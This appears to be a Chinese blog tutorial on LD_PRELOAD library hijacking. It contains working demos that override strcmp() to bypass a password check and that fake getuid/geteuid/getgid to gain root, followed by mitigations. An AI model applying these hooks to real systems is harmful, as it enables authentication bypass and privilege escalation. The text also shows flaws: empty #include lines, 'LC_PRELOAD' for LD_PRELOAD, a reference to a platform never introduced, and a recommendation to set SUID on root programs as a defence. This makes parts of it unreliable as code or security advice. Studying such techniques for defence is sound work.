# linux使用LD_PRELOAD变量黑客
### 1.引入话题
也许这个话题并不新鲜，因为LD_PRELOAD所产生的问题由来已久。不过，在这里，我还是想讨论一下这个环境变量。因为这个环境变量所带来的安全问题非常严重，值得所有的Unix下的程序员的注意。
**链接**
所谓链接，也就是说编译器找到程序中所引用的函数或全局变量所存在的位置。
**动态链接**
动态链接则不会把函数编译到可执行文件中，而是在程序运行时动态地载入函数 库，也就是运行链接。所以，对于动态链接来说，必然需要一个动态链接库。
**静态链接**
静态链接就是把所有所引用到的函数或变量全部地编译到可执行文件中。
**区别**
动态链接库的好处在于，一旦动态库中的函数发生变化，对于可执行程序来说是透明 的，可执行程序无需重新编译。这对于程序的发布、维护、更新起到了积极的作用。对于静态链接的程序来说，函数库中一个小小的改动需要整个程序的重新编译、 发布，对于程序的维护产生了比较大的工作量。当 然，世界上没有什么东西都是完美的，有好就有坏，有得就有失。动态链接所带来的坏处和其好处一样同样是巨大的。因为程序在运行时动态加载函数，这也就为他 人创造了可以影响你的主程序的机会。试想，一旦，你的程序动态载入的函数不是你自己写的，而是载入了别人的有企图的代码，通过函数的返回值来控制你的程序 的执行流程，那么，你的程序也就被人“劫持”了。

### 2.LD_PRELOAD简介
在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker）， 它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和 其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我 们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。

我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。

OK。还是让我用一个例子来看一下用LD_PRELOAD来hack别人的程序。

### 3.示例1
下面是一段测试程序(test.c)，我们来劫持strcmp()函数
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv)
{

	char passwd[] = "password";

	if (argc < 2) {
        printf("usage: %s \n", argv[0]);
        return;
	}

	if (!strcmp(passwd, argv[1])) {
        printf("Correct Password!\n");
        return;
	}

	printf("Invalid Password!\n");
}
```
在上面这段程序中(hack.c)，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：
```
#include <stdio.h>
int strcmp(const char *s1, const char *s2)
{
    printf("hack function invoked. s1=<%s> s2=<%s>\n", s1, s2);
        /* 永远返回0，表示两个字符串相等 */
    return 0;
}
```
编译
```
gcc test.c -o test 后，直接运行./test  111   发现结果正常
接着编译
gcc -Wall -fPIC -shared -o hack.so hack.c
```
设置设置LD_PRELOAD变量：（使我们重写过的strcmp函数的hack.so成为优先载入链接库）
       ```  $ export LD_PRELOAD="./hack.so" ```
再次运行./test 123
发现结果竟然是correct

我们可以看到：
* 我们的hack.so中的strcmp被调用了。
* 主程序中运行结果被影响了。如果这是一个系统登录程序，那么这也就意味着我们用任意口令都可以进入系统了。

### 4.示例2
我们知道在Linux上root是一个权限很大的用户，他可以做很多的事情。
我们写一段hack来改变用户获取权限的值。
```
#include
#include
#include

uid_t geteuid( void ) { return 0; }
uid_t getuid( void ) { return 0; }
uid_t getgid( void ) { return 0; }
```
在这里我们可以看到，我们重载了系统调用。于是我们可以通过设置LC_PRELOAD来迫使主程序使用我们的geteuid/getuid/getgid（它们都返回0，也就是Root权限）。这会导致，上述的那个分布式计算平台的软件在提交端A计算机上调用了geteuid得到当前用户ID是0，并把这个用户ID传到了执行端B计算机上，于是B计算机上的Daemon就会调用seteuid(0)，导致我们的程序运行在了Root权限之下。从而，用户取得了超级用户的权限而为所欲为.

### 5.如何避免
不可否认，LD_PRELOAD是一个很难缠的问题。目前来说，要解决这个问题，只能想方设法让LD_PRELOAD失效。目前而言，有以下面两种方法可以让LD_PRELOAD失效。
1）通过静态链接。使用gcc的-static参数可以把libc.so.6静态链入执行程序中。但这也就意味着你的程序不再支持动态链接。
2）通过设置执行文件的setgid / setuid标志。在有SUID权限的执行文件，系统会忽略LD_PRELOAD环境变量。也就是说，如果你有以root方式运行的程序，最好设置上SUID权限。（如：chmod 4755 daemon）

在一些UNIX版本上，如果你想要使用LD_PRELOAD环境变量，你需要有root权限。但不管怎么说，这些个方法目前来看并不是一个彻底的解决方案，只是一个Workaround的方法，是一种因噎废食的做法，为了安全，只能禁用。
